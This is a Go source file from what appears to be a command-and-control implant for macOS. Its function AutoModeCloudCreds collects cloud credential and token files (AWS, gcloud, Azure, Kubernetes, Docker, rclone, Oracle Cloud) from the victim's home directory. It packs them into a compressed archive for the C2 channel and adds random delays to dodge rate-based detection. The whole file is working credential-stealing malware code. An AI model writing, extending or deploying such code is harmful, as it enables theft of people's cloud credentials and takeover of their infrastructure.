//go:build darwin
// +build darwin

package auto

import (
	"bytes"
	"fix-project/mods/config"
	"fix-project/mods/util"
	"math/rand"
	"os"
	"path/filepath"
	"time"
)

// AutoModeCloudCreds collects cloud CLI credentials and configs from the
// user's home directory, fully in-process (os.Stat + util.Compress, no child
// processes, no staging). Targets (all existence-gated; only present files are
// packed):
//   ~/.aws/credentials, ~/.aws/config
//   ~/.config/gcloud/ (credentials.db, application_default_credentials.json,
//     access_tokens.db, properties — plus legacy ~/.credentials/ JSON)
//   ~/.azure/ (azureProfile.json, msal_token_cache.json, accessTokens.json)
//   ~/.kube/config
//   ~/.docker/config.json
//   ~/.config/oci/, ~/.oci/ (Oracle Cloud)
//   ~/.config/rclone/rclone.conf (often holds cloud tokens)
// Small jitter before touching the files (anti rate-heuristic), same as the
// other collectors. Always reports LOG_SUCCESS with a note if nothing found,
// so the C2 sequence never stalls.
func AutoModeCloudCreds() (string, [][]byte) {

	time.Sleep(time.Duration(200+rand.Intn(700)) * time.Millisecond)

	home, err := os.UserHomeDir()
	if err != nil {
		return config.MSG_LOG, [][]byte{
			[]byte(config.LOG_SUCCESS),
			[]byte("nothing found: no home dir"),
		}
	}

	// candidate files (single files first; dirs handled below)
	candidates := []string{
		filepath.Join(home, ".aws", "credentials"),
		filepath.Join(home, ".aws", "config"),
		filepath.Join(home, ".config", "gcloud", "credentials.db"),
		filepath.Join(home, ".config", "gcloud", "application_default_credentials.json"),
		filepath.Join(home, ".config", "gcloud", "access_tokens.db"),
		filepath.Join(home, ".config", "gcloud", "properties"),
		filepath.Join(home, ".azure", "azureProfile.json"),
		filepath.Join(home, ".azure", "msal_token_cache.json"),
		filepath.Join(home, ".azure", "accessTokens.json"),
		filepath.Join(home, ".kube", "config"),
		filepath.Join(home, ".docker", "config.json"),
		filepath.Join(home, ".config", "rclone", "rclone.conf"),
		filepath.Join(home, ".config", "oci", "config"),
		filepath.Join(home, ".oci", "config"),
	}

	var path_list []string
	for _, p := range candidates {
		if fi, err := os.Stat(p); err == nil && fi.Mode().IsRegular() {
			path_list = append(path_list, p)
		}
	}

	// gcloud legacy credential JSONs: ~/.credentials/*.json (older SDK layout)
	legacy := filepath.Join(home, ".credentials")
	if entries, err := os.ReadDir(legacy); err == nil {
		for _, e := range entries {
			if !e.IsDir() && filepath.Ext(e.Name()) == ".json" {
				path_list = append(path_list, filepath.Join(legacy, e.Name()))
			}
		}
	}

	if len(path_list) == 0 {
		return config.MSG_LOG, [][]byte{
			[]byte(config.LOG_SUCCESS),
			[]byte("nothing found: no cloud credentials"),
		}
	}

	var buf bytes.Buffer
	if err := util.Compress(&buf, path_list, true); err != nil || buf.Len() < 256 {
		return config.MSG_LOG, [][]byte{
			[]byte(config.LOG_SUCCESS),
			[]byte("nothing found: cloud creds unreadable"),
		}
	}

	return config.MSG_FILE, [][]byte{
		[]byte(config.LOG_SUCCESS),
		[]byte("cloud-creds.tar.gz"),
		buf.Bytes(),
	}
}
